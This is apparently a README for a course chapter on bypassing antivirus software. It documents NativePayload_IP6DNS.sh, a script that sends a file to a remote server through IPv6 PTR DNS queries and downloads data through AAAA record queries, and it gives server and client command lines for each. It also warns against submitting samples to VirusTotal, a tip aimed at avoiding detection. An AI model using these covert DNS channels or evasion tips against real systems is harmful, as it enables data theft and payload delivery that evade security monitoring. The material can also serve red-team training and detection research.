# Course : Bypassing Anti Viruses by C#.NET Programming

Part 2 (Infil/Exfiltration/Transferring Techniques by C#)  , Chapter 6 : DATA Transferring Technique by DNS Traffic (AAAA Records)

eBook : Bypassing Anti Viruses by C#.NET Programming

eBook chapter 4 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH6

Related Video : 

Video 1 for chapter 6: 

Video 2 for chapter 6: https://www.youtube.com/watch?v=Ac651MbNJ_U



Warning :Don't Use "www.virustotal.com" or something like that , Never Ever ;D

Recommended:

STEP 1 : Use each AV one by one in your LAB .

STEP 2 : after "AV Signature Database Updated" your Internet Connection should be "Disconnect" .

STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for test .

# NativePayload_IP6DNS.sh help :

Example A-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -r

Example A-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -u text.txt DNSMASQ_IPv4 [delay] (sec) [address] xxxx:xxxx

example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -r

example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -u text.txt 192.168.56.110 delay 0 address fe81:2222

Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via IPv6 PTR Queries to DNS server

# Using IPV6 PTR Queries for Exfil/Upload DATA

![](https://github.com/DamonMohammadbagher/NativePayload_IP6DNS/blob/master/Chapter%206%20-%20DATA%20Transferring%20Technique%20by%20DNS%20Traffic%20-%20AAAA%20Records/Pics/NativePayload_IP6DNS-Via-IPv6-PTR.png)

Example B-Step1: (Server Side ) ./NativePayload_IP6DNS.sh -d makedns test.txt mydomain.com [address] xxxx:xxxx

Example B-Step2: (Client Side ) ./NativePayload_IP6DNS.sh -d getdata mydomain.com DNSMASQ_IPv4"

example IPv4:192.168.56.110 : ./NativePayload_IP6DNS.sh -d makedns text.txt google.com address fe80:1234

example IPv4:192.168.56.111 : ./NativePayload_IP6DNS.sh -d getdata google.com 192.168.56.110

Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via IPv6 AAAA record Query

# Using IPv6 AAAA Records for Infil/Downlaod DATA

![](https://github.com/DamonMohammadbagher/NativePayload_IP6DNS/blob/master/Chapter%206%20-%20DATA%20Transferring%20Technique%20by%20DNS%20Traffic%20-%20AAAA%20Records/Pics/NativePayload_IP6DNS-Via-IPv6-AAAA.png)

